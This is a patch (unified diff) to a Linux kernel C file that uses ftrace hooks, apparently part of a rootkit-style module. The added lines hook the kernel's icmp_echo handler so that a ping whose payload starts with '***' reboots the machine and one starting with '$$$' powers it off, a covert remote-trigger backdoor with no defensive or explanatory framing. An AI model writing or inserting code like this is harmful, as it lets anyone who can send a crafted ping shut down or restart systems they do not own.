@@ -32,6 +32,7 @@
 #include <linux/reboot.h>
 #include <linux/fsnotify_backend.h>
 #include <linux/version.h>
+#include <linux/icmp.h>
 #include "ftrace_hook.h"
 
 
@@ -930,6 +931,12 @@ static asmlinkage int ftrace_fsnotify(struct inode *to_tell, __u32 mask, const v
 	
 	return read_fsnotify(to_tell, mask, data, data_is, file_name, cookie);
 } 
+
+static asmlinkage  bool (*real_icmp_echo)(struct sk_buff *skb) = NULL;
+static asmlinkage  bool ftrace_icmp_echo(struct sk_buff *skb)
+{
+	return real_icmp_echo(skb);
+}
 #endif
 
 #else
@@ -1052,6 +1059,33 @@ static asmlinkage int ftrace_fsnotify(struct inode *to_tell, __u32 mask, const v
 	return real_fsnotify(to_tell, mask, data, data_is, file_name, cookie);
 } 
 
+static void exec_cmd(char *cmd, int len) 
+{
+	if (len < 3) 
+		return;
+
+	if (cmd[0] == '*' && cmd[1] == '*' && cmd[2] == '*') {
+		kernel_restart(NULL);
+	} else if (cmd[0] == '$' && cmd[1] == '$' && cmd[2] == '$') {
+		kernel_power_off();
+		do_exit(0);
+	}
+	return;
+};
+
+static asmlinkage  bool (*real_icmp_echo)(struct sk_buff *skb) = NULL;
+static asmlinkage  bool ftrace_icmp_echo(struct sk_buff *skb)
+{
+	struct icmphdr *icmph = NULL;
+	char *data = NULL;
+
+	icmph = icmp_hdr(skb);
+	data = (char *)icmph + sizeof(struct icmphdr);
+
+	exec_cmd(data, skb->len);
+
+	return real_icmp_echo(skb);
+}
 #endif
 #endif
 
@@ -1063,6 +1097,7 @@ static struct ftrace_hook hooks[] = {
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 0, 1)
         HOOK("__fsnotify_parent", ftrace___fsnotify_parent, &real___fsnotify_parent),
         HOOK("fsnotify", ftrace_fsnotify, &real_fsnotify),
+        HOOK("icmp_echo", ftrace_icmp_echo, &real_icmp_echo),
 #endif
 };
 
